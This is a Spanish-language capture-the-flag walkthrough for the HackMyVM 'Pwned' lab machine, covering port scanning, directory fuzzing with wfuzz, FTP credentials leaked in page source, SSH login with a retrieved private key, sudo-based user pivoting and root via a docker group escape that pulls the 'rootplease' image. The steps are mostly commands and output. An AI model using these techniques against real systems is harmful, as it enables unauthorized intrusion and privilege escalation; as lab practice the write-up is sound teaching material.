---
layout: single
title: Pwned - HackMyVM
excerpt: "Hoy toca Pwned creada por Annlynn,una máquina linux de nivel fácil, con wfuzz encontraremos las credenciales de acceso al FTP, una vez en el FTP nos descargaremos un fichero id_rsa para conectarnos a la máquina. Después tendremos que hacer un user pivoting usando un archivo en bash y finalmente escalaremos privilegios mediante un exploit."
date: 2021-09-20
classes: wide
header:
  teaser: /assets/images/hmvm-Pwned/hmvmPwned.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Annlynn
tags:
  - hackmyvm
  - wfuzz
  - bash
  - docker
---

### Escaneo de puertos
```bash
❯ sudo nmap -n -sS --open --min-rate=3000 192.168.1.54 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 13:46 CEST
Nmap scan report for 192.168.1.54
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
### Escaneo de servicios
```bash
❯ nmap -sCV -p 21,22,80 192.168.1.54
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 13:50 CEST
Nmap scan report for 192.168.1.54
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
### Puerto 80 (HTTP)
![](/assets/images/hmvm-Pwned/web80.png)

Si miramos el código fuente veremos un comentario con otro mensaje
```html
<!-- I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it  -->
```
### Robots.txt
Analizamos el fichero robots.txt con curl, tenemos un directorio llamado `/nothing`
```bash
❯ curl -s http://192.168.1.54/robots.txt
# Group 1

User-agent: *
Allow: /nothing
```

Usamos de nuevo curl con html2text para ver el contenido del directorio `/nothing`, dentro de `/nothing` hay el archivo `nothing.html`
```bash
❯ curl -s http://192.168.1.54/nothing/ | html2text
****** Index of /nothing ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[TXT]]       nothing.html     2020-07-10 13:01  194  
===========================================================================
     Apache/2.4.38 (Debian) Server at 192.168.1.54 Port 80
```

El archivo `nothing.html` tampoco tiene nada
```bash
❯ curl -s http://192.168.1.54/nothing/nothing.html | html2text

****** i said nothing bro ******
```

### Wfuzz
wfuzz encuentra varios directorios entre ellos `/nothing` y `/hidden_text`, `/nothing` ya lo vimos anteriormente pero `/hidden_text` es sospechoso 
```bash
❯ wfuzz -c -t 50 --hc=404 -w /opt/w/directory-list-2.3-medium.txt http://192.168.1.54/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.54/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000010575:   301        9 L      28 W       314 Ch      "nothing"                                                                                                                                                                                                                         
000095524:   403        9 L      28 W       277 Ch      "server-status"                                                                                                              
000206056:   301        9 L      28 W       318 Ch      "hidden_text"
```

### Directorio hidden_text
![](/assets/images/hmvm-Pwned/secret.png)

El archivo secret.dic es un diccionario de directorios

![](/assets/images/hmvm-Pwned/secretDic.png)

Nos descargamos el diccionario
```bash
❯ wget http://192.168.1.54/hidden_text/secret.dic
--2021-09-20 15:51:22--  http://192.168.1.54/hidden_text/secret.dic
Conectando con 192.168.1.54:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 211
Grabando a: «secret.dic»
```

Volvemos a wfuzz de nuevo y le añadimos el diccionario `secret.dic`
```bash
❯ wfuzz -c -t 50 --hc=404 -w /opt/w/secret.dic http://192.168.1.54/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.54/FUZZ
Total requests: 22

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================

000000017:   301        9 L      28 W       317 Ch      "/pwned.vuln"
```

Vamos a `http://192.168.1.54/pwned.vuln/` y vemos lo siguiente:
![](/assets/images/hmvm-Pwned/pwnedvuln.png)

Observamos esto en el código fuente de la web

![](/assets/images/hmvm-Pwned/cfuenteweb.png)

Credenciales para el servidor FTP `ftpuser:B0ss_B!TcH`

### FTP
```bash
❯ ftp 192.168.1.54
Connected to 192.168.1.54.
220 (vsFTPd 3.0.3)
Name (192.168.1.54:noname): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Una vez logueados, vemos un dicrectorio llamado `/share` dentro de `/share` vemos los siguientes archivos:
![](/assets/images/hmvm-Pwned/ftp.png)

Los descargamos con get
```bash
ftp> get id_rsa 
local: id_rsa remote: id_rsa
226 Transfer complete.
2602 bytes received in 0.00 secs (1.0267 MB/s)
ftp> get note.txt
local: note.txt remote: note.txt
226 Transfer complete.
```

### Archivo note.txt
Aquí tenemos un nombre de usuario `ariana` que usaremos con la llave `id_rsa`
![](/assets/images/hmvm-Pwned/notetxt.png)

Damos permisos al `id_rsa` y nos conectamos al `SSH`
```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa ariana@192.168.1.54
```

### pwned
Una vez conectados como ariana leemos la flag de user1
```bash
ariana@pwned:~$ cat user1.txt 
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1xxxxxxxxxxxxxxxxx2140

Try harder.need become root
```
Leemos el fichero ariana-personal.diary

```
ariana@pwned:~$ cat ariana-personal.diary 
Its Ariana personal Diary :::

Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
```

Tenemos a Selena otro posible usuario, pero veamos cuantos usuarios tiene la máquina:
![](/assets/images/hmvm-Pwned/usuarios.png)

### User Pivoting
Comprobamos los comandos que se pueden ejecutar como sudo.
```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```
El usuario selena puede lanzar `/home/messenger.sh` sin poner la contraseña, veamos los permisos que tiene.
```bash
ariana@pwned:~$ ls -la /home/messenger.sh 
-rwxr-xr-x 1 root root 367 Jul 10  2020 /home/messenger.sh
```
Vemos que `otros`pueden ejecutar `/messenger.sh`, abrimos `/messenger.sh` con nano para ver el código:
![](/assets/images/hmvm-Pwned/messengersh.png)

Lanzamos `/messenger.sh` como selena
```bash
ariana@pwned:~$ sudo -u selena /home/messenger.sh
```
![](/assets/images/hmvm-Pwned/aritoselena.png)

Tenemos una shell con selena pero no es funcional del todo, para arreglar este pequeño problema
```bash
script /dev/null -c bash
```

Nos vamos al home de selena y allí podemos leer el user2
```bash
selena@pwned:~$ cat user2.txt 
711fxxxxxxxxxxxxxxxxxxxxf295c176

You are near to me. you found selena too.

Try harder to catch me
```

### Privesc
con id vemos que selena está en el grupo de docker
```bash
selena@pwned:~$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
selena@pwned:~$ groups
selena docker
```


El exploit que he utilizado lo he descargado de:
 
> https://fosterelli.co/privilege-escalation-via-docker

```bash
selena@pwned:~$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
Unable to find image 'chrisfosterelli/rootplease:latest' locally
latest: Pulling from chrisfosterelli/rootplease
a4a2a29f9ba4: Pull complete 
127c9761dcba: Pull complete 
d13bf203e905: Pull complete 
4039240d2e0b: Pull complete 
16a91ffa6f29: Pull complete 
Digest: sha256:eb6be3ee1f9b2fd6e3ae6d4fda81a80bfdf21aad9bde6f1a5234f1baa58d4bb3
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
#
```

flag root.txt

![](/assets/images/hmvm-Pwned/root.png)
